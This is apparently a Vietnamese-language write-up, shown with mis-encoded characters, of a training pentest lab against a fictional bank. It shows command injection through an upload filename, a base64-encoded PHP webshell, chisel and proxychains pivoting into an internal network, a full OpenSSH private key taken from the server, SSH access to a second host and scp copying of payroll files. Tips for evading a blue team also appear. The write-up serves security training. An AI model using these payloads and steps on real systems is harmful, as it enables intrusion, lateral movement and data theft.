---
title: "Pentest XBank"
date: 2024-08-13
draft: false
description: ""
categories: ["Pentest"]
tags: ["burpsuite","PHP", "cft"]
---
---
- Completed on 15/08/2023 | OS: Linux
- Tool used: `nmap`  `burp-suite` `php` `chisel` `ssh` `scp`
---
## Goal

ƒê√≠ch ƒë·∫øn cu·ªëi c√πng c·ªßa lab n√†y l√† khai th√°c l·ªó h·ªïng trang web n√†y v√† ƒë·ªçc ƒë∆∞·ª£c b·∫£ng l∆∞∆°ng c·ªßa nh√¢n vi√™n c·ªßa Ng√¢n h√†ng XBank, trong ƒë√≥ c√≥ `flag`

## Analysis

![cover.jpg](img/cover.jpg)

ƒê·ªëi t∆∞·ª£ng l·∫ßn n√†y th·ª±c hi·ªán pentest l√† Ng√¢n h√†ng Xbank, ·ªü trang web n√†y ch·ªâ c√≥ ch·ª©c nƒÉng n·ªôp CV ƒë·ªÉ tuy·ªÉn nh√¢n vi√™n.

![Untitled](img/Untitled.png)

![Untitled](img/Untitled%201.png)

Nh√¨n s∆° qua th√¨ ·ªü t·ª´ng job c·ª• th·ªÉ cho ph√©p ch√∫ng ta n·ªôp file CV ƒë·ªÉ c√¥ng ty check, ch√∫ng ta s·∫Ω n·ªôp m·ªôt m·ªôt file zip b√¨nh th∆∞·ªùng xem trang web tr·∫£ v·ªÅ g√¨.

![Untitled](img/Untitled%202.png)

![Untitled](img/Untitled%203.png)

Trang web ch·ªâ tr·∫£ v·ªÅ file ƒë√£ ƒë∆∞·ª£c upload th√†nh c√¥ng, xem x√©t qua th√¨ ch·ª©c nƒÉng upload c·ªßa trang web n√†y c√≥ th·ªÉ d√≠nh m·ªôt v√†i l·ªó h·ªïng nh∆∞: `upload file` `command injection` `symlink file zip` ‚Ä¶

·ªû ƒë√¢y sau m·ªôt l√∫c ph√¢n t√≠ch th√¨ th·∫•y r·∫±ng ch·ª©c nƒÉng upload file zip sau ƒë√≥ file zip ƒë∆∞·ª£c unzip, r√µ r√†ng r·∫±ng `filename` ch·∫Øc ch·∫Øn ƒë∆∞·ª£c x·ª≠ l√Ω, xem qua th√¨ trang web n√†y ƒë∆∞·ª£c code t·ª´ php. 

![Untitled](img/Untitled%204.png)

![Untitled](img/Untitled%205.png)

V√¨ response kh√¥ng tr·∫£ v·ªÅ d·ªØ li·ªáu n√†o h·∫øt n√™n ƒë·ªÉ bi·∫øt ch·∫Øc `filename` c√≥ d√≠nh ph·∫£i l·ªó h·ªïng command injection hay kh√¥ng th√¨ xem th√™m m·ªôt cmd `sleep 5` ƒë·ªÉ xem response tr·∫£ v·ªÅ `5s` hay kh√¥ng? 

![Untitled](img/Untitled%206.png)

Sau m·ªói c√¢u l·ªánh linux th√¨ d√¢u `;` ho·∫∑c `|` s·∫Ω ph√¢n c√°ch c√°c c√¢u l·ªánh linux, ·ªü ƒë√¢y ch·ªâ c·∫ßn debug l√† c√≥ th·ªÉ inject ƒë∆∞·ª£c command. Nh∆∞ h√¨nh tr√™n r√µ r√†ng trang web ƒë√£ d√≠nh l·ªó h·ªïng `command injection via upload file` 

##  Exploitation

Sau khi ph√¢n t√≠ch ch√∫ng ta ƒë√£ x√°c ƒë·ªãnh trang web hi·ªán t·∫°i d√≠nh l·ªó h·ªïng `Command Injection` ·ªü tham s·ªë `filename` . B√¢y gi·ªù ch√∫ng ta s·∫Ω th·ª≠ t·∫°o m·ªôt file t√™n l√† hoa v·ªõi c√¢u l·ªánh `>hoa` . N·∫øu th√†nh c√¥ng th√¨ ch√∫ng ta s·∫Ω c√≥ m·ªôt path `/hoa`

![Untitled](img/Untitled%207.png)

![Untitled](img/Untitled%208.png)

V·∫≠y l√† xong! B√¢y gi·ªù ch√∫ng ta s·∫Ω t·∫°o m·ªôt webshell ch·ª© code php ƒë·ªÉ RCE server, v√¨ ƒë·ªÉ ti·ªán v√† thao t√°c d·ªÖ d√†ng n√™n ch√∫ng ta s·∫Ω s·ª≠ d·ª•ng giao th·ª©c POST.
```php
<?php 
// Base64 encoded PHP shell
echo base64_decode('PD9waHAgc3lzdGVtKCRfUE9TVFswXSk7ID8+');
?>
```

C√¢u l·ªánh ƒë·ªÉ t·∫°o file shell l√∫c n√†y s·∫Ω l√†: `echo base64_decode('PD9waHAgc3lzdGVtKCRfUE9TVFswXSk7ID8+') > hoa.php`

![Untitled](img/Untitled%209.png)

Ch√∫ng ta c·∫ßn ch√∫ √Ω r·∫±ng sau khi ch·ªânh l·∫°i webshell v·ªõi ph∆∞∆°ng th·ª©c `POST` th√¨ t·∫°i ·ªü tham s·ªë n√™n d√πng s·ªë v√¨ khi g·ªçi n√≥ ra th√¨ n√≥ s·∫Ω kh√¥ng hi·ªán `Use of undefined constant s - assumed 's' (this will throw an Error in a future version of PHP) in` . V√† ƒë·ªÉ th·ª±c hi·ªán ƒë∆∞·ª£c `POST` v·ªõi tham s·ªë c·∫ßn s·ª≠a l·∫°i m·ªôt ch√∫t ·ªü HTTP Header ·ªü ph·∫ßn `Content-Type` s·ª≠ n√≥ l·∫°i th√†nh gi√° tr·ªã `Content-Type: application/x-www-form-urlencoded` , v√¨ sao c·∫ßn s·ª≠a `Content-Type` v·ªõi gi√° tr·ªã tr√™n:

> Content-Type: application/x-www-form-urlencoded l√† m·ªôt trong nh·ªØng gi√° tr·ªã c·ªßa ti√™u ƒë·ªÅ HTTP Content-Type v√† ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ ch·ªâ ƒë·ªãnh r·∫±ng d·ªØ li·ªáu ƒëang ƒë∆∞·ª£c g·ª≠i ƒëi theo ƒë·ªãnh d·∫°ng URL-encoded. ƒê·ªãnh d·∫°ng n√†y y√™u c·∫ßu d·ªØ li·ªáu ƒë∆∞·ª£c m√£ h√≥a d∆∞·ªõi d·∫°ng chu·ªói `key-value`, trong ƒë√≥ c√°c gi√° tr·ªã ƒë∆∞·ª£c m√£ h√≥a v√† c√°c kho·∫£ng tr·∫Øng ƒë∆∞·ª£c thay th·∫ø b·∫±ng d·∫•u "+" v√† c√°c k√Ω t·ª± ƒë·∫∑c bi·ªát ƒë∆∞·ª£c m√£ h√≥a th√†nh m√£ ASCII d·∫°ng "%xy". ƒê·ªãnh d·∫°ng n√†y ph·ªï bi·∫øn khi g·ª≠i d·ªØ li·ªáu t·ª´ bi·ªÉu m·∫´u HTML.
> 

![Untitled](img/Untitled%2010.png)

### Discovery

Khi t·ªõi ƒë√¢y th√¨ ch√∫ng ta c·∫ßn th·ª±c hi·ªán `discovery system` xem x√©t h·ªá th·ªëng c√≥ nh·ªØng th·ª© g√¨ ch√∫ng ta c√≥ th·ªÉ khai th√°c v√† ki·∫øm th·ª≠ xem c√≥ danh s√°ch l∆∞∆°ng nh√¢n vi√™n hay kh√¥ng?

![Untitled](img/Untitled%2011.png)

·ªû ƒë√¢y ch√∫ng ta s·∫Ω s·ª≠ d·ª•ng `ifconfig` xem giao di·ªán m·∫°ng c·ªßa server, nh∆∞ h√¨nh th√¨ th·∫•y r·∫±ng server c√≥ hai giao di·ªán m·∫°ng ƒë∆∞·ª£c k·∫øt n·ªëi l√† `eth0: 172.23.0.2` v√† `eth1: 172.16.0.4`

![Untitled](img/Untitled%2012.png)

```bash
   ----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAx4AEW4WYqoYE5Bdmiqt201EyDlkHPDeR+HxhQ+7nRXOSzHwXf7ip
SouTY6V0uHfLl/wLi+ycdsQuHYmKvgSGzinfucPiqS8fzMsnqyo5tcnvNvDZkh3xcqtCEJ
Y37RU66So18bHD4sFo+h3oiYmBOLt9Gm52rNAYxlkZgeeFXqIwNpS2fJoDm6sTRivjrfVj
HuanL/D50OD8aG7Kwzyohlbdy8meEYeWGr7ZbQnMVoMCH12oMaGwQanYFb5/pXQvtZ9VCg
AhXa9YdepebNUvdDjjSzyCv16nspZsYt7Zcc1hv20u3emK5LlIneBgk8ofmgvckjqhaY/I
bL+OtC8gfhXFlWqV9iLMPVtM0BE2NRmDEWh8pC9FE5KIQ1izATGEZolNNq4emHULp2FRml
/pLlB3k9ks6jm9+bwiiLCahLqews6ySVQ7paEpt6EKT+pOV5WUJnK/kU5qCwwLvKXqPeNB
qdSQBXqXZh8bGkQsMNezdWAY3XD9CBvGC8poa/qjAAAFiC4Zn6kuGZ+pAAAAB3NzaC1yc2
EAAAGBAMeABFuFmKqGBOQXZoqrdtNRMg5ZBzw3kfh8YUPu50Vzksx8F3+4qUqLk2OldLh3
y5f8C4vsnHbELh2Jir4Ehs4p37nD4qkvH8zLJ6sqObXJ7zbw2ZId8XKrQhCWN+0VOukqNf
Gxw+LBaPod6ImJgTi7fRpudqzQGMZZGYHnhV6iMDaUtnyaA5urE0Yr4631Yx7mpy/w+dDg
/GhuysM8qIZW3cvJnhGHlhq+2W0JzFaDAh9dqDGhsEGp2BW+f6V0L7WfVQoAIV2vWHXqXm
zVL3Q440s8gr9ep7KWbGLe2XHNYb9tLt3piuS5SJ3gYJPKH5oL3JI6oWmPyGy/jrQvIH4V
xZVqlfYizD1bTNARNjUZgxFofKQvRROSiENYswExhGaJTTauHph1C6dhUZpf6S5Qd5PZLO
o5vfm8IoiwmoS6nsLOsklUO6WhKbehCk/qTleVlCZyv5FOagsMC7yl6j3jQanUkAV6l2Yf
GxpELDDXs3VgGN1w/QgbxgvKaGv6owAAAAMBAAEAAAGANRwwjMjhHqx1Ct/r7Yi+Jn2cLN
OoqHBGzPcX0cT9DrE46HU0sEzRzMWhpEp860sBCWIRFNwVv0x01moyZGnCFYpyQ/sREWc5
OQTwd5HTMUEkDOVLlqmgCJ3tBYtoMhaPy1jwaXqgonJI5yUlLdBMdXT8VhgIQfNYVR2NO9
cN22akHTOz7TH3Oe7uP6UZhMsp6yUOZyXo66GpsIemNRml57WicEkpapNE87PRIEUWgAV6
gC0nxKa9zI1RuGAxjTODs5uQ9jSf9p81pJ6YD3WT3W18YMh0MEOYlAVT7+xksWpeqhs3/z
ENBmYlLU3tqYDAqeGWmCp/qevnnKNacXQpQllgaWBWNrl7fLlWTlWuJKOh23DkgtNul70G
eiztZt18mt2/UGLCVnq5fcB7xOlXiEhtb5MGsWMmelXHy59y7GCgREbWKr3o3kXytFVKCz
Y45OmWTcyGOKKxel/iqJpinSHR8MNjc7O8O7GoZ+RiSia59icFwFoLkcJmeB5aimShAAAA
wB7uOPvfsSYn6QLmlw2tW6x3jI5Txwn3SuHeGcB57x/rpZQRE/vjfQ3snUQwqpYx5O9wLX
ZF8f0Jx18cyUQCLaM6mq3nJrTvGOzCTLmohq5RbazP/wF6XZQM/8d5Y8IhwNirThDpZ5Kw
dwzMamb2MCYDJ/qVp4cEQ9Qby1KK88dSIoiQPLq9KGBy8bdMqDX57pC4dZZWtroxNCaZvS
sCLJTInBnrhJY8J0M/+ldQcQiFaH735kD7c8U/GMfArfs7FQAAAMEA6WipRaLXv7hIhRso
4MByauRhgXsiJCnSQIg4h5oOf/7oXUcmF4OcHW8oleqgkG/62+MgVfBgcRK0VaQTzp4n8g
227VcTEylsP40CZuYHdf9iv62M50LPegEYktTcPsWK4VNM1gZim4pFXvNSeEFciyAuvi4V
c1R61bEq9/lR5J0m7JQ/6OVoGBQ4SMDC8TrEJvpGnzpmJo70upkclc3niXBIxdvy1YDk2f
MU9u2ibHZ/gou+kYgJlJT6fdfgdvOxAAAAwQDazyyC6gdSHiW0B8N+PCj4lUMHF02M2DwW
vyjgnpjiD70QIM8l53K9rR2PNtcLG6nVFt8LIlS+Y8n/jsPEB5O4pIxkqE02O7VipC2+nB
0emOiPjSDHgPVxfK98HJsWXiGSjucQjd6vpeofQfDKvWwVY6ToYmIKkSiXFxIDyvPCYhlY
FTrB61Uka8/QKIIsBBHH+yTOEF1zIJ8LFZWB1JpuTkYipkBSEpz40AIQx57QpWbDUYtUBv
Ga99FmwiT9zJMAAAAOcm9vdEBjdHI3OTg0OTEBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

·ªû ƒë√¢y ch√∫ng ta v·ª´a l·∫•y ƒë∆∞·ª£c m·ªôt `OPENSSH Private Key` , l∆∞u key v·ªÅ m√°y c·ªßa ch√∫ng ta ƒë·ªÉ xem c√≥ th·ªÉ d√πng key n√†y ƒëƒÉng nh·∫≠p n∆°i n√†o kh√°c n·ªØa kh√¥ng? L√∫c n√†y th√¨ ch∆∞a bi·∫øt!

![Untitled](img/Untitled%2013.png)

V√¨ ƒë√¢y l√† key k·∫øt n·ªëi SSH n√™n th·ª≠ xem server n√†y c√≤n ch·∫°y tr√™n nh·ªØng `port` n√†o n·ªØa b·∫±ng l·ªánh: `netstat -tuln`

- `t`¬†ho·∫∑c¬†`-tcp`: Hi·ªÉn th·ªã c√°c k·∫øt n·ªëi TCP.
- `u`¬†ho·∫∑c¬†`-udp`: Hi·ªÉn th·ªã c√°c k·∫øt n·ªëi UDP.
- `l`¬†ho·∫∑c¬†`-listening`: Ch·ªâ hi·ªÉn th·ªã c√°c c·ªïng l·∫Øng nghe (listening ports).
- `n`¬†ho·∫∑c¬†`-numeric`: Hi·ªÉn th·ªã ƒë·ªãa ch·ªâ IP v√† s·ªë c·ªïng d∆∞·ªõi d·∫°ng s·ªë h·ªçc, kh√¥ng gi·∫£i quy·∫øt t√™n mi·ªÅn ho·∫∑c d·ªãch v·ª•.

![Untitled](img/Untitled%2014.png)

Ch√∫ng ta th·∫•y r·∫±ng con server n√†y ch·ªâ ch·∫°y tr√™n `port 80` m√† kh√¥ng c√≥ `port 22`, t·ª´ ƒë√¢y c√≥ th·ªÉ ch·∫Øc r·∫±ng Key ·ªü tr√™n d√πng login con server kh√°c.

Nh∆∞ tr√™n trong qu√° tr√¨nh discovery th√¨ thu th·∫≠p ƒë∆∞·ª£c hai giao di·ªán m·∫°ng, v√¨ v·∫≠y c·∫ßn th·ª±c hi·ªán scan m·∫°ng n·ªôi b·ªô. ƒê·ªÉ scan m·∫°ng n·ªôi b·ªô c√≥ th·ªÉ s·ª≠ d·ª•ng `nmap` ho·∫∑c `Angry IP Scanner` , nh∆∞ng r√µ r√†n ·ªü con server n√†y kh√¥ng c√≥ hai c√°i n√†y, kh√¥ng n√™n t·∫£i v·ªÅ nmap ho·∫∑c Angry IP v√¨ s·∫Ω ƒë·ªÉ l·∫°i d·∫•u v·∫øt khi b·ªã Blue team truy v·∫øt.

V√¨ v·∫≠y ch√∫ng ta s·∫Ω x·ª≠ dung k·ªπ thu·∫≠t `Pivoting` : 

- L√Ä C√ÅC K·ª∏ THU·∫¨T GI√öP ATTACKER C√ì TH·ªÇ CH·∫†M ƒê·∫æN NH·ªÆNG V√ôNG M·∫†NG KH√ÅC S√ÇU H∆†N
- üí°D·ª∞A TR√äN √ù T∆Ø·ªûNG: L·ª¢I D·ª§NG M√ÅY B·ªä HACK NH∆Ø M·ªòT ƒêI·ªÇM CHUY·ªÇN TI·∫æP (PIVOT POINT)

![Untitled](img/Untitled%2015.png)


> üí° Khi th·ª±c hi·ªán pivoting, m·ªôt m√°y t√≠nh ho·∫∑c m·∫°ng con ƒë∆∞·ª£c xem nh∆∞ l√† m·ªôt ƒëi·ªÉm trung gian (pivot point) ƒë·ªÉ g·ª≠i v√† nh·∫≠n l∆∞u l∆∞·ª£ng t·ª´ c√°c m√°y t√≠nh kh√°c tr√™n m·∫°ng. Qua ƒë√≥, attacker (ng∆∞·ªùi t·∫•n c√¥ng) c√≥ th·ªÉ ti·∫øp c·∫≠n v√† ki·ªÉm so√°t c√°c m√°y t√≠nh kh√°c tr√™n m·∫°ng m√† kh√¥ng tr·ª±c ti·∫øp k·∫øt n·ªëi ƒë·∫øn ch√∫ng.
> Pivoting th∆∞·ªùng ƒë∆∞·ª£c th·ª±c hi·ªán b·∫±ng c√°ch s·ª≠ d·ª•ng c√°c c√¥ng c·ª• v√† k·ªπ thu·∫≠t nh∆∞ relay, proxy, port forwarding ho·∫∑c tunneling. Nh·ªØng c√¥ng c·ª• n√†y cho ph√©p attacker chuy·ªÉn ti·∫øp l∆∞u l∆∞·ª£ng qua m√°y t√≠nh ƒëi·ªÉm trung gian m√† kh√¥ng b·ªã ph√°t hi·ªán ho·∫∑c b·ªã ch·∫∑n b·ªüi c√°c bi·ªán ph√°p b·∫£o m·∫≠t m·∫°ng.



V·ªõi k·ªπ thu·∫≠t n√†y ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng m·ªôt framework l√†  https://github.com/jpillora/chisel [L∆∞u √Ω c·∫ßn t·∫£i ƒë√∫ng b·∫£n ph√π h·ª£p v·ªõi ki·∫øn tr√∫c c·ªßa con server ƒë√≥]

Ch√∫ng ta s·∫Ω t·∫£i chisel ·ªü hai n∆°i l√† m√°y c·ªßa m√¨nh v√† con server tr√™n s·ª≠ d·ª•ng c√¢u l·ªánh: 
`wget [https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz)`
Sau khi t·∫£i v·ªÅ c·∫ßn gi·∫£i n√©n: `gzip -d chisel`  

![Untitled](img/Untitled%2016.png)

![Untitled](img/Untitled%2017.png)

![Untitled](img/Untitled%2018.png)

![Untitled](img/Untitled%2019.png)

Ch√∫ √Ω r·∫±ng file `chisel` ƒëang ch·ªâ c√≥ quy·ªÅn ƒë·ªçc v√† ghi file n√†y ƒë·ªëi v·ªõi user, v√¨ v·∫≠y ch√∫ng ta c·∫ßn c·∫•p quy·ªÅn excute cho n√≥ b·∫±ng c√°ch: `chmod +x chisel` , l∆∞u √Ω r·∫±ng ·ªü burp suite d·∫•u `+` s·∫Ω t∆∞∆°ng ƒë∆∞∆°ng v·ªõi k√Ω t·ª± `space`n√™n c·∫ßn urlencode n√≥ tr∆∞·ªõc: `Ctr+U`

![Untitled](img/Untitled%2020.png)

![Untitled](img/Untitled%2021.png)

Tool tunnel ƒë√£ c√†i xong 2 m√°y, b√¢y gi·ªù s·∫Ω th·ª±c hi·ªán ch·∫°y n√≥ server v√† client, ƒë·∫ßu ti√™n ch·∫°y ph√≠a server: 

```bash
./chisel server -p 443 --socks5
```

- ƒê·∫ßu ti√™n ch·∫°y ·ªü ph√≠a server ch√∫ng ta hack ƒë∆∞·ª£c sau ƒë√≥ ch·ªçn port 443 v√¨ th·∫•y r·∫±ng con server n√†y c√≥ HTTPS ho·∫∑c l√† m·ªôt port n√†o kh√°c m√† kh√¥ng tr√πng v√† ch·ªçn option giao th·ª©c ƒë·ªÉ ch·∫°y l√† socks5.

Khi n√†y server ƒë√£ setup xong, b√¢y gi·ªù ch·∫°y ·ªü ph√≠a local m√† tr∆∞·ªõc h·∫øt c·∫ßn bi·∫øt ƒë·ªãa ch·ªâ ip trang web xbank d√πng `nslookup`

![Untitled](img/Untitled%2022.png)

Ch√∫ng ta c√≥ `ip: 178.128.19.56` v√† nh·∫≠p c√¢u l·ªánh sau n√™n d√πng th√™m flag `-v`(verbose) ƒë·ªÉ hi·ªán r√µ c√°c k·∫øt n·ªëi:

```bash
./chisel client -v 178.128.19.56:443 socks
```

![Untitled](img/Untitled%2023.png)

![Untitled](img/Untitled%2024.png)

C·∫ßn ch√∫ √Ω m·ªôt x√≠u n·ªØa c·∫ßn s·ª≠a file config proxychains4, v√¨ nh∆∞ ·∫£nh tr√™n th√¨ tool chisel s·∫Ω forward v√†o ƒë·ªãa ch·ªâ `127.0.0.1` v·ªõi port `1080` v·ªõi method `sock5` , l∆∞u √Ω file ph·∫£i role root m·ªõi s·ª≠a ƒë∆∞·ª£c.


> üí° T·ªáp c·∫•u h√¨nh¬†`proxychains4.conf`¬†l√† t·ªáp c·∫•u h√¨nh cho ·ª©ng d·ª•ng ProxyChains version 4. ProxyChains l√† m·ªôt c√¥ng c·ª• proxy forwarding (chuy·ªÉn ti·∫øp proxy) ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ ƒë·ªãnh tuy·∫øn c√°c y√™u c·∫ßu m·∫°ng th√¥ng qua proxy.



![Untitled](img/Untitled%2025.png)

B√¢y gi·ªù ch√∫ng ta s·∫Ω th·ª≠ truy c·∫≠p qua ip n·ªôi b·ªô c·ªßa con server kia xem ƒë√£ tunnel connection th√†nh c√¥ng hay ch∆∞a:

- S·ª≠ d·ª•ng l·ªánh `proxychains cmd`  [Gi·∫£i th√≠ch ph√≠a d∆∞·ªõi]


>üí° ProxyChains l√† m·ªôt c√¥ng c·ª• proxy trong m√¥i tr∆∞·ªùng Linux. N√≥ cho ph√©p b·∫°n chuy·ªÉn h∆∞·ªõng l∆∞u l∆∞·ª£ng m·∫°ng c·ªßa c√°c ·ª©ng d·ª•ng qua m·ªôt ho·∫∑c nhi·ªÅu proxy. Khi s·ª≠ d·ª•ng ProxyChains, c√°c ·ª©ng d·ª•ng c·ªßa b·∫°n s·∫Ω kh√¥ng tr·ª±c ti·∫øp k·∫øt n·ªëi v·ªõi m√°y ch·ªß ƒë√≠ch m√† thay v√†o ƒë√≥ s·∫Ω truy·ªÅn qua c√°c m√°y ch·ªß proxy trung gian.
> ProxyChains ho·∫°t ƒë·ªông b·∫±ng c√°ch c·∫•u h√¨nh m·ªôt danh s√°ch c√°c proxy trung gian trong t·ªáp c·∫•u h√¨nh c·ªßa n√≥. Khi m·ªôt ·ª©ng d·ª•ng g·ª≠i y√™u c·∫ßu m·∫°ng, ProxyChains s·∫Ω chuy·ªÉn ti·∫øp y√™u c·∫ßu ƒë·∫øn proxy ƒë·∫ßu ti√™n trong danh s√°ch. Proxy n√†y s·∫Ω chuy·ªÉn ti·∫øp y√™u c·∫ßu ƒë·∫øn proxy ti·∫øp theo trong danh s√°ch v√† ti·∫øp t·ª•c cho ƒë·∫øn khi ƒë·∫°t ƒë∆∞·ª£c m√°y ch·ªß ƒë√≠ch. Qu√° tr√¨nh n√†y gi√∫p ·∫©n danh ƒë·ªãa ch·ªâ IP th·ª±c s·ª± c·ªßa b·∫°n v√† tƒÉng t√≠nh b·∫£o m·∫≠t khi truy c·∫≠p v√†o c√°c d·ªãch v·ª• tr·ª±c tuy·∫øn.


![Untitled](img/Untitled%2026.png)

Ch√∫ng ta ƒë√£ trafic th√†nh c√¥ng, b√¢y gi·ªù ƒë√£ setup th√†nh c√¥ng v√† ch√∫ng ta s·∫Ω ch·ªânh tr√™n tr√¨nh duy·ªát th√™m tunnel m·ªõi c√≥ ip v√† port gi·ªëng v·ªõi proxychains ƒë·ªÉ n√≥ c√≥ th·ªÉ forward t·ªõi tr√™n extension FoxyProxy v√† b·∫≠t n√≥ l√™n cho n√≥ ƒëi qua tunnel.

![Untitled](img/Untitled%2027.png)

![Untitled](img/Untitled%2028.png)

Th√†nh c√¥ng truy c·∫≠p ip n·ªôi b·ªô tr√™n tr√¨nh duy·ªát, l√∫c n√†y c√≥ th·ªÉ xem m√°y ch√∫ng ta coi nh∆∞ m√°y ch√∫ng ta l√† m·ªôt ph·∫ßn c·ªßa m·∫°ng n·ªôi b·ªô c√¥ng ty ƒë√≥. B√¢y gi·ªù ch√∫ng ta ti·∫øp t·ª•c discovery b·∫±ng c√°ch nmap ip n·ªôi b·ªô: `proxychains nmap 172.16.0.4/24 -vvv -p 80`

- ·ªû ƒë√¢y ch√∫ng ta scan nmap qua proxychains v·ªõi prefix-length l√† 24 v√¨ netmask 255.255.255.0, ch·ªâ scan m·ªói port 80.

```bash
‚îî‚îÄ$ proxychains nmap 172.16.0.4/24 -vvv -p 80
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-16 06:01 PDT
Initiating Ping Scan at 06:01
Scanning 256 hosts [2 ports/host]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.1:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.4:80  ...  OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.5:80  ...  OK
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.6:80 <--socket error or timeout!
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.9:80 <--socket error or timeout!
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.10:80 <--socket error or timeout!
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Ping Scan Timing: About 1.76% done; ETC: 06:34 (0:32:36 remaining)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.13:80 <--socket error or timeout!
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.14:80 <--socket error or timeout!
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.17:80 <--socket error or timeout!
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.18:80 <--socket error or timeout!
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.21:80 <--socket error or timeout!
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.22:80 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.0.25:80 <--socket error or timeout!
```

Xem r·∫±ng ·ªü ƒë√¢y c√≥ m·ªôt IP n·ªôi b·ªô l√†: `172.16.0.5` ho·∫°t ƒë·ªông, l√∫c n√†y ch√∫ng ta s·∫Ω truy c·∫≠p v√†o ip n√†y tr√™n tr√¨nh duy·ªát xem n√≥ l√† g√¨.

![Untitled](img/Untitled%2029.png)

![Untitled](img/Untitled%2030.png)

ƒê√¢y l√† m·ªôt trang ƒëƒÉng tin c·ªßa nh√¢n vi√™n v√† admin trong m·∫°ng n·ªôi b·ªô, c√≥ m·ªôt b√†i vi·∫øt c·ªßa admin v·ªÅ m·ªôt domain: [`http://files.cbjs-bank.cyberjutsu-lab.tech/`](http://files.cbjs-bank.cyberjutsu-lab.tech/) v√† admin b·∫£o r·∫±ng th√¥ng tin ƒëƒÉng nh·∫≠p m·∫∑c ƒë·ªãnh cho m√°y ch·ªß n√†y gi·ªëng v·ªõi th√¥ng tin ƒëƒÉng nh·∫≠p c·ªßa blog n√†y.

![Untitled](img/Untitled%2031.png)

B√¢y gi·ªù ch√∫ng ta c√≥ hai server m·ªõi `172.16.0.5` v√† [`http://files.cbjs-bank.cyberjutsu-lab.tech/`](http://files.cbjs-bank.cyberjutsu-lab.tech/) t∆∞∆°ng ·ª©ng v·ªõi ƒë·ªãa ch·ªâ IP l√†: `128.199.157.202` . Nh∆∞ng sau khi d√πng nmap scan th√¨ kh√¥ng c√≥ ƒë·ªãa ch·ªâ ip n√†o m·ªü port 22 v·∫≠y ch·ªâ c√≤n l·∫°i IP: `128.199.157.202` , nh·ªõ c·∫•p quy·ªÅn cho key: `chmod 600 devops_key`

```bash
‚îÄ‚îÄ(shang„âøshang)-[~/Desktop/Cyber]
‚îî‚îÄ$ chmod 600 devops_key 
                                                                                                                                                                          
‚îå‚îÄ‚îÄ(shang„âøshang)-[~/Desktop/Cyber]
‚îî‚îÄ$ ssh -i devops_key devops@128.199.157.202                        
Linux 16af87874c22 4.15.0-197-generic #208-Ubuntu SMP Tue Nov 1 17:23:37 UTC 2022 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug 16 10:42:12 2023 from 178.128.27.63
devops@16af87874c22:~$ id
uid=1000(devops) gid=1000(devops) groups=1000(devops)
```

ƒê√£ truy c·∫≠p th√†nh c√¥ng m√°y ch·ªß kh√°c b√¢y gi·ªù l·∫°i ti·∫øp t·ª•c discovery xem server n√†y c√≥ g√¨ kh√¥ng? V√¨ web tr√™n c≈©ng ƒë∆∞·ª£c build t·ª´ php ch√∫ng ta s·∫Ω xem th·ª≠ `document root` c√≥ g√¨ kh√¥ng nh√©.

![Untitled](img/Untitled%2032.png)

·ªû ƒë√¢y ch√∫ng ta ƒë√£ th·∫•y ƒë∆∞·ª£c m·ªôt v√†i file quan tr·ªçng trong ƒë√≥ c√≥ file b·∫£ng l∆∞∆°ng c·ªßa nh√¢n vi√™n. Ch√∫ng ta s·∫Ω t·∫£i h·∫øt file ·ªü ƒë√¢y v·ªÅ local b·∫±ng `scp`¬†(Secure Copy) c√¢u l·ªánh s·∫Ω nh∆∞ sau:

```bash
scp -r -i devops_key user@remote_host:/path/to/destination .
```

Trong ƒë√≥:

- `-r`: T√πy ch·ªçn n√†y cho ph√©p scp sao ch√©p th∆∞ m·ª•c v√† n·ªôi dung b√™n trong.
- `devops_key`: T·ªáp kh√≥a ri√™ng t∆∞ ƒë·ªÉ x√°c th·ª±c qua SSH.
- `.` : ƒë·∫°i di·ªán cho th∆∞ m·ª•c hi·ªán t·∫°i tr√™n m√°y local, nghƒ©a l√† th∆∞ m·ª•c ƒë√≠ch tr√™n m√°y local s·∫Ω tr√πng v·ªõi th∆∞ m·ª•c ngu·ªìn tr√™n m√°y t·ª´ xa.
